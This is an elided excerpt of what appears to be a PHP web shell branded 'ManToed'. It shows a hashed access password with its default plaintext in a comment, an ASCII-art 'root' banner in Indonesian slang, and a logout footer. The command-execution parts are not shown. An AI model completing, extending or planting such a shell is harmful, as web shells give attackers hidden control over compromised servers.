...
$auth_pass = "28df7924f20a8a8684bcbc511d5a8015"; // default: GuaAnakPalingTampanSeduniaJancok
$color = "#00ff00";
...
< root@ManToed:~# apa lu ngajak gelud!1!1! >
 -----------------------------------------
   \         ,        ,
    \       /(        )`
     \      \ \___   / |
...
if($_GET['logout'] == true) {
	...
	echo "<center>".date("Y")." - <a href=' ' target='_blank'><font color=aqua>ManToed</font></a></center>";
}
?>
</html>
